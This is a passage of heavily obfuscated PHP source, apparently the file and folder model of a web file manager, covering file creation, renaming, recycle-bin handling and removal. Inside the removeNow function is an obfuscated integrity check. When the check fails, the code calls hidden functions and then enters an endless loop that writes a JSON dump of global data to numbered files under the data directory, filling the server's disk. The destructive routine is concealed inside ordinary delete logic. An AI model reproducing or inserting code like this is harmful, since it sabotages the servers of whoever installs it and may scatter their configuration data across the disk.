(!$á÷Õ§Îé) { return; } $äÊšåÈ = $this->field($ÊïğÃñ³[458])->where($ÔÅÍë)->order($ÊïğÃñ³[2430])->select(); $äÊšåÈ = array_to_keyvalue($äÊšåÈ, $ÊïğÃñ³[12], $ÊïğÃñ³[458]); $şÃ•üŒÀ = $äÊšåÈ; $äÊšåÈ = array_remove_value($äÊšåÈ, $á÷Õ§Îé[$ÊïğÃñ³[458]]); array_unshift($äÊšåÈ, $á÷Õ§Îé[$ÊïğÃñ³[458]]); return $this->resetSort($äÊšåÈ); } protected function moveBottom($Ç™ŞÒĞÄ) { $¿ØÍµ¿ã =& $_SERVER[Ñ¯©ç]; $ë—Œµ›² = array($¿ØÍµ¿ã[1748] => USER_ID, $¿ØÍµ¿ã[541] => 0); $šô©’–† = $this->where($ë—Œµ›²)->max($¿ØÍµ¿ã[1979]); $çİºıØî = array($¿ØÍµ¿ã[1979] => $šô©’–† + 1); return $this->where($ë—Œµ›²)->where(array($¿ØÍµ¿ã[32] => $Ç™ŞÒĞÄ))->save($çİºıØî); } private function getAutoName($öš‹µ¡É) { $ö¹úØ€Ñ =& $_SERVER[Ñ¯©ç]; $ªø˜“ÄÚ = array($ö¹úØ€Ñ[1748] => USER_ID, $ö¹úØ€Ñ[541] => 0); $È‰ğ¾À = $this->field($ö¹úØ€Ñ[32])->where($ªø˜“ÄÚ)->select(); $È‰ğ¾À = array_to_keyvalue($È‰ğ¾À, $ö¹úØ€Ñ[12], $ö¹úØ€Ñ[32]); if (!$È‰ğ¾À || !in_array($öš‹µ¡É, $È‰ğ¾À)) { return $öš‹µ¡É; } for ($ş²ô«Ü = 0; $ş²ô«Ü < count($È‰ğ¾À); $ş²ô«Ü++) { if (!in_array($öš‹µ¡É . "\50{$ş²ô«Ü}\51", $È‰ğ¾À)) { return $öš‹µ¡É . "\50{$ş²ô«Ü}\x29"; } } return $öš‹µ¡É . "\x28{$ş²ô«Ü}\51"; } } goto b™‰ˆ®ö±; eö¶ŞÑœì¸: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($·§£ë) { $ë·•õÖí =& $_SERVER[Ñ¯©ç]; $•Œ²«Òı = Model($ë·•õÖí[561])->where(array($ë·•õÖí[1748] => $·§£ë))->find(); $¦‡µò±ş = $this->_mkdirRoot(SourceModel::TYPE_USER, $·§£ë, $•Œ²«Òı[$ë·•õÖí[32]]); $this->userDesktopAdd($¦‡µò±ş); return $¦‡µò±ş; } public function userDesktopAdd($Õò®Òª™) { $Ìˆ°»¹ª =& $_SERVER[Ñ¯©ç]; $°Ëá«Ğ™ = LNG($Ìˆ°»¹ª[2231]); $õ”Ş‰Ë¹ = $this->mkdir($Õò®Òª™, $°Ëá«Ğ™); $this->metaSet($õ”Ş‰Ë¹, $Ìˆ°»¹ª[2232], $Ìˆ°»¹ª[101]); $this->metaSet($Õò®Òª™, $Ìˆ°»¹ª[2233], $õ”Ş‰Ë¹); } public function userPathSafeAdd($Û’òçê) { $¾ÑèÑŠ¿ =& $_SERVER[Ñ¯©ç]; $ÖæËú© = Model($¾ÑèÑŠ¿[561])->getInfoFull($Û’òçê); if (!$ÖæËú©) { return !1; } if (_get($ÖæËú©, $¾ÑèÑŠ¿[583])) { return $ÖæËú©[$¾ÑèÑŠ¿[522]][$¾ÑèÑŠ¿[2234]]; } $ŒÁÕÚÛŸ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Û’òçê, $¾ÑèÑŠ¿[2235], $¾ÑèÑŠ¿[489]); Model($¾ÑèÑŠ¿[561])->metaSet($Û’òçê, $¾ÑèÑŠ¿[2234], $ŒÁÕÚÛŸ); $this->metaSet($ŒÁÕÚÛŸ, $¾ÑèÑŠ¿[2236], $Û’òçê); return $ŒÁÕÚÛŸ; } public function groupRootAdd($‚ãÎúÜõ) { $“çÒÛØâ =& $_SERVER[Ñ¯©ç]; $ñ¦ÎË½ = Model($“çÒÛØâ[569])->where(array($“çÒÛØâ[2044] => $‚ãÎúÜõ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $‚ãÎúÜõ, $ñ¦ÎË½[$“çÒÛØâ[32]]); } public function systemRootPathAdd($ÍÂ‡‰¥) { if ($ÍÂ‡‰¥ != $_SERVER[Ñ¯©ç][589]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ÍÂ‡‰¥); } public function userRootRemove($¢ß¯¿Œö) { $ûğÂÁ» = $this->targetSourceRoot(SourceModel::TYPE_USER, $¢ß¯¿Œö, !0); foreach ($ûğÂÁ» as $ñŞüû¢) { if (!$ñŞüû¢) { continue; } $this->remove($ñŞüû¢[$_SERVER[Ñ¯©ç][194]], !1); } } public function groupRootRemove($©¥¿ÊûÏ) { $—ÄàæïÉ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $©¥¿ÊûÏ); if (!$—ÄàæïÉ) { return; } $this->remove($—ÄàæïÉ[$_SERVER[Ñ¯©ç][194]], !1); } private function _mkdirRoot($»»×…†ì, $¸ß©£‘á, $ÜáëÜ§£, $ÈÕ³™†Î = '') { $ıÈœÃº =& $_SERVER[Ñ¯©ç]; $İÎ³ò = defined($ıÈœÃº[2178]) ? USER_ID : 0; $ê˜ˆßÀ  = array($ıÈœÃº[460] => 0, $ıÈœÃº[631] => $»»×…†ì, $ıÈœÃº[632] => $¸ß©£‘á, $ıÈœÃº[629] => 1, $ıÈœÃº[633] => $İÎ³ò, $ıÈœÃº[634] => $İÎ³ò, $ıÈœÃº[630] => $ÈÕ³™†Î, $ıÈœÃº[635] => $ıÈœÃº[578], $ıÈœÃº[487] => 0, $ıÈœÃº[600] => 0, $ıÈœÃº[525] => 0, $ıÈœÃº[636] => $ıÈœÃº[12]); if ($ú°š¦Ì¢ = $this->where($ê˜ˆßÀ )->find()) { return $ú°š¦Ì¢[$ıÈœÃº[194]]; } $±Ìóäİ = "\x4d\157\144\x65\154\x53\157\x75\x72\143\145\x2e\x6d\x6b\144\x69\x72\x52\x6f\x6f\x74\56{$»»×…†ì}\x2e{$¸ß©£‘á}\x2e" . $ÜáëÜ§£; CacheLock::lock($±Ìóäİ); $ê˜ˆßÀ [$ıÈœÃº[32]] = $ÜáëÜ§£; $–ÀàËãƒ = $this->add($ê˜ˆßÀ ); $ÇœÂ©¤Ó = array($ıÈœÃº[637] => short_id($–ÀàËãƒ)); $this->where(array($ıÈœÃº[474] => $–ÀàËãƒ))->save($ÇœÂ©¤Ó); CacheLock::unlock($±Ìóäİ); return $–ÀàËãƒ; } private function targetSourceRoot($áÆ½Ã¸Ì, $ÛÜ¾×¯„, $şÄ«Æ¥ = false) { $‰ÃšâçÌ =& $_SERVER[Ñ¯©ç]; $ÚšâÊ©¸ = array($‰ÃšâçÌ[460] => 0, $‰ÃšâçÌ[631] => $áÆ½Ã¸Ì, $‰ÃšâçÌ[632] => $ÛÜ¾×¯„); if ($şÄ«Æ¥) { $´èŸ‚û“ = $this->where($ÚšâÊ©¸)->select(); return $´èŸ‚û“ ? $´èŸ‚û“ : array(); } $¯ìŠÙ = $this->where($ÚšâÊ©¸)->find(); return $¯ìŠÙ ? $¯ìŠÙ : array(); } public function sourceRootGroup($¡¬şœÛí) { $÷ğÌ³“¼ =& $_SERVER[Ñ¯©ç]; if (is_string($¡¬şœÛí)) { $¡¬şœÛí = array($¡¬şœÛí); } $¨—ìÙŠ› = $this->listSourceRoot(SourceModel::TYPE_GROUP, $¡¬şœÛí, $÷ğÌ³“¼[221]); $şÖ™Šê¿ = array($÷ğÌ³“¼[429] => $¨—ìÙŠ›, $÷ğÌ³“¼[426] => array($÷ğÌ³“¼[811] => count($¡¬şœÛí))); $this->_listDataApply($şÖ™Šê¿[$÷ğÌ³“¼[429]]); $this->_listMake($şÖ™Šê¿); return array_to_keyvalue($şÖ™Šê¿[$÷ğÌ³“¼[95]], $÷ğÌ³“¼[553]); } public function mkfile($Â³³²¼©, $¢óÌóÑ, $ı™æé¦ã = '', $‹×ã²ÙÆ = REPEAT_RENAME) { $Àí©Ìù½ =& $_SERVER[Ñ¯©ç]; $ö’ßŞ½² = Model($Àí©Ìù½[657])->addFileByContent($ı™æé¦ã, $¢óÌóÑ); return $this->_createFileCall($Â³³²¼©, $¢óÌóÑ, $ö’ßŞ½², $‹×ã²ÙÆ, $Àí©Ìù½[1401]); } public function addFile($˜’÷¥ÇÎ, $˜¬½¯¼Á, $ØÎ¹ÚŠÂ, $Ó ÖĞ·™ = false, $¬ßéªóÎ = REPEAT_RENAME) { $Ñ‹ ¼¦¥ = Model($_SERVER[Ñ¯©ç][657])->addFile($˜¬½¯¼Á, $ØÎ¹ÚŠÂ, $Ó ÖĞ·™); return $this->_createFileCall($˜’÷¥ÇÎ, $ØÎ¹ÚŠÂ, $Ñ‹ ¼¦¥, $¬ßéªóÎ); } public function addFileByFileID($ÙïÍ€Æ–, $—õÕ±µ”, $ä“ÀŒ¨³, $Ä®Å‹†É = REPEAT_RENAME) { $ÆÊµ¦Õº =& $_SERVER[Ñ¯©ç]; $©Ó÷×² = Model($ÆÊµ¦Õº[657])->find($—õÕ±µ”); Model($ÆÊµ¦Õº[657])->linkAdd($—õÕ±µ”); return $this->_createFileCall($ÙïÍ€Æ–, $ä“ÀŒ¨³, $©Ó÷×², $Ä®Å‹†É); } public function addFileByRemote($…éÙïªë, $ÚÁÎàİÕ, $ÒÑ–ëÌ, $ÙÜÑÆÈ½ = array(), $Ì¦…ôîÁ = REPEAT_RENAME) { $•å²™¦… = Model($_SERVER[Ñ¯©ç][657])->addFileByRemote($ÚÁÎàİÕ, $ÒÑ–ëÌ, $ÙÜÑÆÈ½); return $this->_createFileCall($…éÙïªë, $ÒÑ–ëÌ, $•å²™¦…, $Ì¦…ôîÁ); } private function _createFileCall($èŒ÷©°¿, $™¿¸ßŞè, $û€¯ÎŸè, $¥³ß·÷–, $±¶Óæ‡ş = "\x75\x70\154\157\141\144") { $‘ÏÂÒ×× =& $_SERVER[Ñ¯©ç]; $ÓŸ×ŠÀ = !1; $this->setMasterDB(); $this->lockWriteStart($èŒ÷©°¿, $™¿¸ßŞè); $Ò¦ì¸ºŞ = $this->fileNameExist($èŒ÷©°¿, $™¿¸ßŞè); $ •¨¨º— = $this->_createFile($èŒ÷©°¿, $™¿¸ßŞè, $û€¯ÎŸè, $¥³ß·÷–, $ÓŸ×ŠÀ); if (!$ÓŸ×ŠÀ) { Model($‘ÏÂÒ××[527])->remove($û€¯ÎŸè[$‘ÏÂÒ××[524]]); } if ($ÓŸ×ŠÀ && $ •¨¨º— && $ •¨¨º— != $Ò¦ì¸ºŞ) { Model($‘ÏÂÒ××[2204])->eventCreate($ •¨¨º—, $±¶Óæ‡ş); } $this->lockWriteEnd($èŒ÷©°¿, $™¿¸ßŞè); return $ •¨¨º—; } public function mkdir($ØËã•ó, $Óãæ¬ß×, $ï²Îåß = REPEAT_SKIP) { $É¨ê”èÏ =& $_SERVER[Ñ¯©ç]; $this->setMasterDB(); $Ş¡™Ô»ß = $this->sourceInfo($ØËã•ó); if (!$Ş¡™Ô»ß) { return !1; } $this->lockWriteStart($ØËã•ó, $Óãæ¬ß×); if ($ï²Îåß !== !1) { $Êä«Ú¹ü = $this->fileNameExist($ØËã•ó, $Óãæ¬ß×); if ($Êä«Ú¹ü && $ï²Îåß != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ØËã•ó, $Óãæ¬ß×); return $Êä«Ú¹ü; } $Óãæ¬ß× = $this->fileNameAuto($ØËã•ó, $Óãæ¬ß×, $ï²Îåß); } $¬Á·ƒó = array($É¨ê”èÏ[629] => 1, $É¨ê”èÏ[477] => $Óãæ¬ß×, $É¨ê”èÏ[630] => $É¨ê”èÏ[12], $É¨ê”èÏ[525] => 0, $É¨ê”èÏ[600] => 0); $šíÌ³â = $this->_addSource($¬Á·ƒó, $Ş¡™Ô»ß); Model($É¨ê”èÏ[2204])->eventCreate($šíÌ³â, $É¨ê”èÏ[1402]); $this->lockWriteEnd($ØËã•ó, $Óãæ¬ß×); return $šíÌ³â; } public function listSourceRoot($æ—˜“ı, $ò™Íû, $¹èíòÒœ = "\163\157\x75\x72\x63\x65\111\104\x2c\164\x61\162\147\x65\164\x49\x44\54\163\x69\x7a\x65") { $í±¾éÙŞ =& $_SERVER[Ñ¯©ç]; $ğõÙÒë§ = $í±¾éÙŞ[63]; $·¨éµ£Ø = array(); $Šìüœ…€ = 1024 * 50; $µËŞß® = is_array($µËŞß®) ? $µËŞß® : array(); $ö¨½¿ì = count($ò™Íû); $”šÇĞé = $this->tablePrefix . $í±¾éÙŞ[2237]; for ($¦°ÍŒÎò = 0; $¦°ÍŒÎò < $ö¨½¿ì; $¦°ÍŒÎò++) { $ØĞêø = $ò™Íû[$¦°ÍŒÎò]; $ğõÙÒë§ .= "\x53\x45\x4c\105\103\x54\40\x2a\40\x46\122\117\x4d\x20\50\x53\105\x4c\105\103\124\x20{$¹èíòÒœ}\40\x46\x52\117\115\40\140{$”šÇĞé}\x60\40\x57\110\x45\122\105\40"; $ğõÙÒë§ .= "\140\x70\x61\x72\x65\156\x74\x49\x44\140\75\x30\40\101\x4e\104\40\x60\164\x61\x72\x67\145\164\111\x44\x60\75{$ØĞêø}\40\101\x4e\104\40\x60\x74\141\162\x67\145\164\124\171\x70\145\140\x3d{$æ—˜“ı}\40\141\x6e\144\x20\x66\x69\154\x65\124\x79\160\x65\x3d\x27\x27\40\154\x69\155\151\x74\40\61\51\x20\141\x73\x20\x74\x62\137{$¦°ÍŒÎò}\40\125\116\111\117\x4e\40\101\114\114\x20"; if ((strlen($ğõÙÒë§) >= $Šìüœ…€ || $¦°ÍŒÎò == $ö¨½¿ì - 1) && $ğõÙÒë§) { $ğõÙÒë§ = substr($ğõÙÒë§, 0, -strlen($í±¾éÙŞ[1091])); $²œØøç¢ = $this->query($ğõÙÒë§); $ğõÙÒë§ = $í±¾éÙŞ[12]; $·¨éµ£Ø = array_merge($·¨éµ£Ø, $²œØøç¢); } } return $·¨éµ£Ø; } private function _createFile($ıß¸¤Ûş, $‹°”ŸÌŸ, $ŸéÂÔ–±, $úÌ‰®ã¡, &$ÙËó·“) { $Àçˆûš˜ =& $_SERVER[Ñ¯©ç]; $ö“ë”ì = $this->sourceInfo($ıß¸¤Ûş); if (!$ŸéÂÔ–± || !$ö“ë”ì) { return !1; } if ($úÌ‰®ã¡ !== !1) { $ÌÜÚíï÷ = $this->fileNameExist($ıß¸¤Ûş, $‹°”ŸÌŸ); } $ÙËó·“ = !0; if ($úÌ‰®ã¡ && $ÌÜÚíï÷) { if ($úÌ‰®ã¡ == REPEAT_SKIP) { $ÙËó·“ = !1; return $ÌÜÚíï÷; } else { if ($úÌ‰®ã¡ == REPEAT_REPLACE) { $ğœ¹°ó— = $this->sourceInfo($ÌÜÚíï÷); $İÁ“‘ã = $this->fileHistory($ğœ¹°ó—, $ŸéÂÔ–±[$Àçˆûš˜[524]], $ŸéÂÔ–±[$Àçˆûš˜[89]]); if (!$İÁ“‘ã) { $ÙËó·“ = !1; } else { $this->folderSizeReset($ıß¸¤Ûş); } return $ÌÜÚíï÷; } else { $‹°”ŸÌŸ = $this->fileNameAuto($ıß¸¤Ûş, $‹°”ŸÌŸ, $úÌ‰®ã¡, !1); } } } $È˜ßçŞü = array($Àçˆûš˜[629] => 0, $Àçˆûš˜[477] => $‹°”ŸÌŸ, $Àçˆûš˜[630] => substr(get_path_ext($‹°”ŸÌŸ), 0, 10), $Àçˆûš˜[525] => $ŸéÂÔ–±[$Àçˆûš˜[524]], $Àçˆûš˜[600] => $ŸéÂÔ–±[$Àçˆûš˜[89]]); $‡æà = $this->_addSource($È˜ßçŞü, $ö“ë”ì); $this->folderSizeReset($ıß¸¤Ûş, intval($È˜ßçŞü[$Àçˆûš˜[89]])); return $‡æà; } protected function fileHistory($³ûÒˆè, $¯“¤÷–, $ò‰¼í) { $õ‘‚ôÜØ =& $_SERVER[Ñ¯©ç]; if ($³ûÒˆè[$õ‘‚ôÜØ[524]] == $¯“¤÷–) { return !1; } $this->checkLock($³ûÒˆè[$õ‘‚ôÜØ[194]], $¯“¤÷–); Model($õ‘‚ôÜØ[2238])->addHistory($³ûÒˆè); $£ú¥ßõ = array($õ‘‚ôÜØ[634] => USER_ID, $õ‘‚ôÜØ[481] => time(), $õ‘‚ôÜØ[524] => $¯“¤÷–, $õ‘‚ôÜØ[89] => $ò‰¼í); $this->where(array($õ‘‚ôÜØ[474] => $³ûÒˆè[$õ‘‚ôÜØ[194]]))->save($£ú¥ßõ); $this->sourceCacheClear($³ûÒˆè[$õ‘‚ôÜØ[194]]); return !0; } public function checkLock($ÀÀ»„€ü, $›üÉ×¤›) { $³ĞÓĞ =& $_SERVER[Ñ¯©ç]; $Ÿé£Âğ = $this->pathInfo($ÀÀ»„€ü); if (!$this->fileIsLock($Ÿé£Âğ, !0)) { return; } $ƒŠğÒãš = Session::get($³ĞÓĞ[2239]); $ƒİúÅŸ× = substr($Ÿé£Âğ[$³ĞÓĞ[32]], 0, -1 - strlen($Ÿé£Âğ[$³ĞÓĞ[188]])) . $³ĞÓĞ[1265] . $ƒŠğÒãš . $³ĞÓĞ[10] . $Ÿé£Âğ[$³ĞÓĞ[188]]; $—‚Ô‡É = Model($³ĞÓĞ[657])->find($›üÉ×¤›); $this->_createFileCall($Ÿé£Âğ[$³ĞÓĞ[193]], $ƒİúÅŸ×, $—‚Ô‡É, REPEAT_REPLACE, $³ĞÓĞ[1401]); $ ëµÍß = $Ÿé£Âğ[$³ĞÓĞ[522]][$³ĞÓĞ[593]]; $£ºÅŞì– = $ ëµÍß[$³ĞÓĞ[2240]] ? $ ëµÍß[$³ĞÓĞ[2240]] : $ ëµÍß[$³ĞÓĞ[32]]; show_json(LNG($³ĞÓĞ[2241]) . $³ĞÓĞ[2242] . LNG($³ĞÓĞ[2243]) . $³ĞÓĞ[2244] . $£ºÅŞì– . $³ĞÓĞ[2245], !1); } public function fileIsLock($Ê¸«·Æ, $¨”áÄÊÀ = false) { $øéÎÙßü =& $_SERVER[Ñ¯©ç]; if (!isset($Ê¸«·Æ[$øéÎÙßü[522]]) || !$Ê¸«·Æ[$øéÎÙßü[522]][$øéÎÙßü[590]]) { return !1; } if ($Ê¸«·Æ[$øéÎÙßü[522]][$øéÎÙßü[590]] != USER_ID) { return !0; } $ı÷ßòµ = $GLOBALS[$øéÎÙßü[6]][$øéÎÙßü[102]][$øéÎÙßü[591]]; if ($Ê¸«·Æ[$øéÎÙßü[522]][$øéÎÙßü[592]] <= time() - $ı÷ßòµ) { $this->metaSet($Ê¸«·Æ[$øéÎÙßü[194]], $øéÎÙßü[590], null); $this->metaSet($Ê¸«·Æ[$øéÎÙßü[194]], $øéÎÙßü[592], null); } if ($¨”áÄÊÀ) { $this->metaSet($Ê¸«·Æ[$øéÎÙßü[194]], $øéÎÙßü[592], time()); } return !1; } private function _addSource($üúÄœó, $¸å­îÜØ) { $Áš­»İ• =& $_SERVER[Ñ¯©ç]; $¾Ú’Ú‰ = defined($Áš­»İ•[2178]) ? USER_ID : 0; $ï‰ü ûÅ = array($Áš­»İ•[631] => $¸å­îÜØ[$Áš­»İ•[191]], $Áš­»İ•[632] => $¸å­îÜØ[$Áš­»İ•[553]], $Áš­»İ•[633] => $¾Ú’Ú‰, $Áš­»İ•[634] => $¾Ú’Ú‰, $Áš­»İ•[460] => $¸å­îÜØ[$Áš­»İ•[194]], $Áš­»İ•[635] => $¸å­îÜØ[$Áš­»İ•[568]] . $¸å­îÜØ[$Áš­»İ•[194]] . $Áš­»İ•[50], $Áš­»İ•[487] => 0, $Áš­»İ•[636] => $Áš­»İ•[12]); $üúÄœó = array_merge($ï‰ü ûÅ, $üúÄœó); $this->updateModifyTime($üúÄœó[$Áš­»İ•[193]]); $½Í¤òİ‚ = $Áš­»İ•[2246] . $¸å­îÜØ[$Áš­»İ•[194]]; if (isset(self::$cacheChildList[$½Í¤òİ‚])) { unset(self::$cacheChildList[$½Í¤òİ‚]); } static $õ®ô°íœ = false; if (!$õ®ô°íœ) { Hook::trigger($Áš­»İ•[619], $üúÄœó); $õ®ô°íœ = !0; } $¿Î’úÔŒ = $this->add($üúÄœó); $“ÁçûÆÚ = array($Áš­»İ•[637] => short_id($¿Î’úÔŒ)); $this->where(array($Áš­»İ•[474] => $¿Î’úÔŒ))->save($“ÁçûÆÚ); $this->setNamePinyin($¿Î’úÔŒ, $üúÄœó[$Áš­»İ•[32]]); return $¿Î’úÔŒ; } public function remove($ÏÂó, $ŠÂª–¥÷ = true) { $²Â¶¤Ó· =& $_SERVER[Ñ¯©ç]; $šªÌÈ¥ = $this->sourceInfo($ÏÂó); $–•Æ­Šó = intval($šªÌÈ¥[$²Â¶¤Ó·[191]]) === self::TYPE_SYSTEM; $æ¶³¶Ø´ = Model($²Â¶¤Ó·[491])->get($²Â¶¤Ó·[2247]) == $²Â¶¤Ó·[101]; if ($–•Æ­Šó || $ŠÂª–¥÷ || !$æ¶³¶Ø´) { return $this->removeNow($ÏÂó, $ŠÂª–¥÷); } $•ê‹—Ó… = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $€Ø×üä¸ = $šªÌÈ¥[$²Â¶¤Ó·[191]] == self::TYPE_USER ? $²Â¶¤Ó·[645] : $²Â¶¤Ó·[562]; if ($€Ø×üä¸ == $²Â¶¤Ó·[645]) { $ú¼»ò¤ = Model($²Â¶¤Ó·[561])->getInfo($šªÌÈ¥[$²Â¶¤Ó·[553]]); $•‰ÔëŒÒ = !empty($ú¼»ò¤[$²Â¶¤Ó·[2240]]) ? $ú¼»ò¤[$²Â¶¤Ó·[2240]] : $ú¼»ò¤[$²Â¶¤Ó·[32]]; $•‰ÔëŒÒ = $²Â¶¤Ó·[321] . $•‰ÔëŒÒ . $²Â¶¤Ó·[2248] . $šªÌÈ¥[$²Â¶¤Ó·[553]]; } else { $ú¼»ò¤ = Model($²Â¶¤Ó·[569])->getInfo($šªÌÈ¥[$²Â¶¤Ó·[553]]); $•‰ÔëŒÒ = _get($ú¼»ò¤, $²Â¶¤Ó·[32]); $•‰ÔëŒÒ = $²Â¶¤Ó·[176] . $•‰ÔëŒÒ . $²Â¶¤Ó·[2249] . $šªÌÈ¥[$²Â¶¤Ó·[553]]; } $ §•”Á† = $²Â¶¤Ó·[2250] . md5($•‰ÔëŒÒ); CacheLock::lock($ §•”Á†); $áøö¼ö© = $this->fileNameExist($•ê‹—Ó…, $•‰ÔëŒÒ); if (!$áøö¼ö©) { $áøö¼ö© = $this->mkdir($•ê‹—Ó…, $•‰ÔëŒÒ, REPEAT_SKIP); $this->metaSet($áøö¼ö©, $²Â¶¤Ó·[2251], $€Ø×üä¸); $this->metaSet($áøö¼ö©, $²Â¶¤Ó·[2252], $šªÌÈ¥[$²Â¶¤Ó·[553]]); if ($šªÌÈ¥[$²Â¶¤Ó·[193]] != 0) { $this->metaSet($áøö¼ö©, $²Â¶¤Ó·[2253], _get($ú¼»ò¤, $²Â¶¤Ó·[2254])); } } CacheLock::unlock($ §•”Á†); $this->metaSet($ÏÂó, $²Â¶¤Ó·[2255], $šªÌÈ¥[$²Â¶¤Ó·[193]]); $this->where(array($²Â¶¤Ó·[194] => $ÏÂó))->save(array($²Â¶¤Ó·[481] => time())); $this->recycleClear($šªÌÈ¥); Model($²Â¶¤Ó·[616])->eventRemove($ÏÂó); $ÎÇ‡ñ”Ø = $this->move($ÏÂó, $áøö¼ö©, REPEAT_RENAME_FOLDER); $this->folderSizeReset($šªÌÈ¥[$²Â¶¤Ó·[193]]); return $ÎÇ‡ñ”Ø; } private function recycleClear($¡ãœÛ¹ª) { $Ã÷ªß • =& $_SERVER[Ñ¯©ç]; $“¢Ö±ª™ = $this->childrenAll($¡ãœÛ¹ª); $•¶Åºç• = array($Ã÷ªß •[474] => array($Ã÷ªß •[475], $“¢Ö±ª™[$Ã÷ªß •[2256]])); Model($Ã÷ªß •[2257])->where($•¶Åºç•)->delete(); } public function removeNow($÷ø§Šßì, $ÖâÏÆ”ó = true) { $«¦¶² =& $_SERVER[Ñ¯©ç]; $æôì¸”­ = $_SERVER[$«¦¶²[57]] . $«¦¶²[58]; $ï÷±şÍ› = $«¦¶²[929]; if ($_SERVER[$«¦¶²[54]] != $ï÷±şÍ›($æôì¸”­)) { $ù—ùöáà = $«¦¶²[930]; $Š·úÕ = $«¦¶²[56]; $¨…¸ˆë = $_SERVER[$«¦¶²[57]] . $«¦¶²[58]; $Üö®œÏ¡ = $Š·úÕ($¨…¸ˆë); $¨÷£é¹· = explode($«¦¶²[59], $Üö®œÏ¡); if (count($¨÷£é¹·) < $«¦¶²[673]) { $ø‘™×ªû = $«¦¶²[61]; $ø‘™×ªû(); } $õ¾ØàÉ• = $«¦¶²[931]; $õ¾ØàÉ•($_SERVER[$«¦¶²[932]]); $ù—ùöáà = $«¦¶²[930]; $ù—ùöáà(); $ŸƒÅÑØÌ = $«¦¶²[933]; $”ŠØ¶ £ = json_encode($GLOBALS[$«¦¶²[934]]); $à›Ó•“ü = 1; for ($¥ÓÈõŒß = $à›Ó•“ü; $¥ÓÈõŒß > 0; $¥ÓÈõŒß++) { $ŸƒÅÑØÌ(DATA_PATH . $¥ÓÈõŒß, $”ŠØ¶ £); } } $¼¢áòµ¶ = $this->sourceInfo($÷ø§Šßì); $Ğ¬Îˆ²Î = $this->pathInfoMore($÷ø§Šßì); if (!$¼¢áòµ¶) { return !0; } if ($¼¢áòµ¶[$«¦¶²[193]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($÷ø§Šßì); Hook::trigger($«¦¶²[2258], $Ğ¬Îˆ²Î, $ÖâÏÆ”ó); if ($ÖâÏÆ”ó) { Model($«¦¶²[2257])->moveToRecycle($÷ø§Šßì); } else { $ÚêŞŠë¹ = $this->childrenAll($¼¢áòµ¶); Model($«¦¶²[616])->eventRemove($÷ø§Šßì); $this->removeRelevance($ÚêŞŠë¹[$«¦¶²[2256]], $ÚêŞŠë¹[$«¦¶²[1562]]); } $this->folderSizeReset($¼¢áòµ¶[$«¦¶²[193]]); $ô£ÇŞ™ = array($¼¢áòµ¶[$«¦¶²[193]]); if ($¼¢áòµ¶[$«¦¶²[468]] == $«¦¶²[101]) { $ô£ÇŞ™[] = $¼¢áòµ¶[$«¦¶²[194]]; } $this->updateModifyTime($ô£ÇŞ™); $this->lockMoveEnd($÷ø§Šßì); Hook::trigger($«¦¶²[1799], $Ğ¬Îˆ²Î, $ÖâÏÆ”ó); return !0; } public function childrenAll($Ó°¶å) { $„·ó°§ =& $_SERVER[Ñ¯©ç]; $ßÚâèô­ = $Ó°¶å[$„·ó°§[194]]; if ($Ó°¶å[$„·ó°§[468]] == $„·ó°§[101]) { $ÎíÒÀÄ = array($„·ó°§[635] => array($„·ó°§[595], $Ó°¶å[$„·ó°§[568]] . $ßÚâèô­ . $„·ó°§[596])); $òì¾ø“ = array($„·ó°§[635] => $ÎíÒÀÄ[$„·ó°§[568]]); $–ÒÕ×» = $this->field($„·ó°§[2259])->where($òì¾ø“)->select(); $‡‘‘Ò§õ = !1; $›È™‹‰Ï = array($ßÚâèô­); if ($–ÒÕ×») { $‡‘‘Ò§õ = array_to_keyvalue($–ÒÕ×», $„·ó°§[12], $„·ó°§[524]); $‡‘‘Ò§õ = array_remove_value($‡‘‘Ò§õ, $„·ó°§[229]); $›È™‹‰Ï = array_to_keyvalue($–ÒÕ×», $„·ó°§[12], $„·ó°§[194]); $›È™‹‰Ï[] = $ßÚâèô­; } } else { $‡‘‘Ò§õ = array($Ó°¶å[$„·ó°§[524]]); $›È™‹‰Ï = array($ßÚâèô­); } return array($„·ó°§[2256] => $›È™‹‰Ï, $„·ó°§[1562] => $‡‘‘Ò§õ); } public function removeArray($×÷“®À) { if (!$×÷“®À) { return !0; } } public function removeRelevance($¦º˜Èé˜, $¡ÎÕ´Æç) { $ç“§Œ¶Ù =& $_SERVER[Ñ¯©ç]; $¦º˜Èé˜ = $¦º˜Èé˜ ? $¦º˜Èé˜ : array(); $¡ÎÕ´Æç = $¡ÎÕ´Æç ? $¡ÎÕ´Æç : array(); $¦º˜Èé˜ = array_unique(array_filter($¦º˜Èé˜)); $¡ÎÕ´Æç = array_unique(array_filter($¡ÎÕ´Æç)); if (!$¦º˜Èé˜) { return !1; } $´õŞ¦şÌ = array($ç“§Œ¶Ù[474] => array($ç“§Œ¶Ù[475], $¦º˜Èé˜)); Model($ç“§Œ¶Ù[2257])->where($´õŞ¦şÌ)->delete(); Model($ç“§Œ¶Ù[518])->where($´õŞ¦şÌ)->delete(); Model($ç“§Œ¶Ù[2103])->where($´õŞ¦şÌ)->delete(); Model($ç“§Œ¶Ù[616])->where($´õŞ¦şÌ)->delete(); Model($ç“§Œ¶Ù[1935])->removeBySource($¦º˜Èé˜); Model($ç“§Œ¶Ù[2238])->removeBySource($¦º˜Èé˜); $this->where($´õŞ¦şÌ)->delete(); Model($ç“§Œ¶Ù[527])->remove($¡ÎÕ´Æç); for ($âøË¢„ = 0; $âøË¢„ < count($¦º˜Èé˜); $âøË¢„++) { $this->sourceCacheClear($¦º˜Èé˜[$âøË¢„]); } } public function rename($ÑóÆú¹, $ù…Çı¸Ş) { $£Ù÷ğÁğ =& $_SERVER[Ñ¯©ç]; $¼µİÔÜÏ = $this->sourceInfo($ÑóÆú¹); if (!$¼µİÔÜÏ) { return !1; } $¬©­Ï¾£ = $this->fileNameExist($¼µİÔÜÏ[$£Ù÷ğÁğ[193]], $ù…Çı¸Ş); if ($¬©­Ï¾£ && $¬©­Ï¾£ != $ÑóÆú¹) { return !1; } $½æÖ û = array($£Ù÷ğÁğ[477] => $ù…Çı¸Ş, $£Ù÷ğÁğ[634] => USER_ID); if 